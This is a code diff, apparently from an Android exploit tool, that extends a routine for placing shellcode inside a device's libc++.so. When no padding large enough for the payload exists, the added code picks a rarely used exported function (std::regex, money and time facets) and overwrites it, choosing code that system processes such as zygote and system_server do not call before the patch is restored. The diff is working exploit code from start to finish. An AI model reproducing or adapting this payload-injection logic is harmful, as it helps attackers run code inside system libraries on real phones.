@@ -45,9 +45,92 @@ static int find_code_cave(int fd, uint64_t exec_off, uint64_t exec_filesz,
         }
     }
 
-    printf("no code cave large enough (need %zu, largest found %llu) - DEVICE NOT SUPPORTED\n",
+    printf("no zero run large enough for the shellcode (need %zu, largest found %llu)\n",
            shellcode_size, (unsigned long long)max_run_len);
     return 1;
+}
+
+/* ---- donor functions ----------------------------------------------------
+ *
+ * A packed libc++.so has no zero run big enough and too little slack left in
+ * the last page of its executable segment (Samsung's android12-5.10 build
+ * leaves 112 bytes). The payload is then written over a whole exported
+ * function instead of into padding.
+ *
+ * The donor has to be code nothing on the device calls between the patch and
+ * the restore a couple of seconds later. std::regex and the money/time facets
+ * are the safe bets: init, zygote, system_server and the vendor daemons never
+ * touch them, and they are large enough that a 400-500 byte hole fits inside a
+ * single one.
+ */
+static const char *const kColdPatterns[] = {
+    "regex", "collate", "moneypunct", "money_get", "money_put",
+    "time_get", "time_put", "codecvt", "wstring_convert", "wbuffer_convert",
+    "filesystem", "random_device", "seed_seq",
+};
+
+static int is_cold_symbol(const char *name) {
+    for (size_t i = 0; i < sizeof(kColdPatterns) / sizeof(kColdPatterns[0]); i++)
+        if (strstr(name, kColdPatterns[i])) return 1;
+    return 0;
+}
+
+static int find_donor_function(int fd, uint64_t dynsym_off, uint64_t dynsym_size,
+                               uint64_t dynstr, uint64_t exec_off,
+                               uint64_t exec_filesz, uint64_t exec_vaddr,
+                               uint64_t hook_off, size_t need, uint64_t *out_off) {
+    uint64_t best_off = 0, best_size = 0;
+    uint64_t cand = 0, largest = 0;
+    int found = 0;
+    char best_name[200] = { 0 };
+
+    for (int i = 0; i < (int)(dynsym_size / sizeof(Elf64_Sym)); i++) {
+        Elf64_Sym sym;
+        if (lseek64(fd, dynsym_off + i * sizeof(Elf64_Sym), SEEK_SET) < 0) continue;
+        if (read(fd, (char *)&sym, sizeof(sym)) < 0) continue;
+        if ((sym.st_info & 0xf) != 2) continue;              /* STT_FUNC only */
+        if (sym.st_value < exec_vaddr) continue;
+        if (sym.st_value - exec_vaddr >= exec_filesz) continue;
+
+        if (lseek64(fd, dynstr + sym.st_name, SEEK_SET) < 0) continue;
+        char name[200];
+        if (read(fd, name, sizeof(name) - 1) < 0) continue;
+        name[sizeof(name) - 1] = 0;
+        if (!is_cold_symbol(name)) continue;
+        if (sym.st_size > largest) largest = sym.st_size;
+
+        if (sym.st_size < need) continue;
+        if (sym.st_value - exec_vaddr + sym.st_size > exec_filesz) continue;
+
+        uint64_t off = exec_off + (sym.st_value - exec_vaddr);
+        /* Start at the function's own entry and only ever move forward onto a
+         * 16-byte boundary: rounding down would eat the last instruction of the
+         * function in front of it. Rounding up costs at most 15 bytes of the
+         * donor and keeps every CBC block aligned. */
+        uint64_t pay = (off + 15) & ~(uint64_t)15;
+        if (pay + need > off + sym.st_size) continue;
+        if (hook_off >= pay && hook_off < pay + need) continue;
+
+        /* smallest qualifying function: the least live code overwritten */
+        if (!found || sym.st_size < best_size) {
+            best_off  = pay;
+            best_size = sym.st_size;
+            found     = 1;
+            memcpy(best_name, name, sizeof(best_name));
+        }
+        cand++;
+    }
+
+    if (!found) {
+        printf("no cold donor function for %zu bytes (largest cold function %llu)\n",
+               need, (unsigned long long)largest);
+        return 1;
+    }
+    printf("using donor function at 0x%llx (%llu bytes of %s overwritten, %llu candidates)\n",
+           (unsigned long long)best_off, (unsigned long long)best_size, best_name,
+           (unsigned long long)cand);
+    *out_off = best_off;
+    return 0;
 }
 
 int find_hook_target(const char *libcxx, const char *symname,
@@ -205,7 +288,13 @@ int find_hook_target(const char *libcxx, const char *symname,
 
     if (find_code_cave(fd, executable_off, executable_filesz,
                        *payload_target, shellcode_size, payload_target)) {
-        close(fd); return 1;
+        /* No padding and no slack left: overwrite a cold function instead. */
+        if (find_donor_function(fd, dynsym_offset, dynsym_size, dynstr,
+                                executable_off, executable_filesz, executable_vaddr,
+                                *hook_target, shellcode_size, payload_target)) {
+            printf("no code cave and no donor function - DEVICE NOT SUPPORTED\n");
+            close(fd); return 1;
+        }
     }
 
     close(fd);
